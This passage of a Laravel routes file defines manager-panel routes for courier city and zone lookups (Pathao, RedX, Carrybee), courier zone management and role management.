    Route::post('/manager-courier-pathao_ajax_get_cities', 'CourierController@pathaoAjaxGetCities')->name('manager.courier.pataho.ajax.get.cities');
    Route::post('/manager-courier-pathao_ajax_get_zones', 'CourierController@pathaoAjaxGetZones')->name('manager.courier.pataho.ajax.get.zones');

    Route::post('/manager-courier-redx_ajax_get_cities', 'CourierController@redxAjaxGetCities')->name('manager.courier.redx.ajax.get.cities');
    Route::post('/manager-courier-carrybee_ajax_get_cities', 'CourierController@carrybeeAjaxGetCities')->name('manager.courier.carrybee.ajax.get.cities');
    Route::post('/manager-courier-carrybee_ajax_get_zones', 'CourierController@carrybeeAjaxGetZones')->name('manager.courier.carrybee.ajax.get.zones');

    //courier zone
    Route::get('/manager-courier-zone', 'CourierController@zoneIndex')->name('manager.courier.zone');
    Route::post('/manager-courier-zone/store', 'CourierController@zoneStore')->name('manager.courier.zone.store');
    Route::post('/manager-courier-zone/update', 'CourierController@zoneUpdate')->name('manager.courier.zone.update');
    Route::get('/manager-courier-zone/delete/{id}', 'CourierController@zoneDelete')->name('manager.courier.zone.delete');
    Route::post('/manager-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('manager.courier.ajax.get.zones');

    //roles
    Route::get('/manager-roles', 'RoleController@index')->name('manager.roles');
    Route::post('/manager-roles/store', 'RoleController@store')->name('manager.roles.store');
    Route::post('/manager-roles/update', 'RoleController@update')->name('manager.roles.update');
    Route::get('/manager-roles/{id}/{role}/delete', 'RoleController@delete')->name('manager.roles.delete');
});
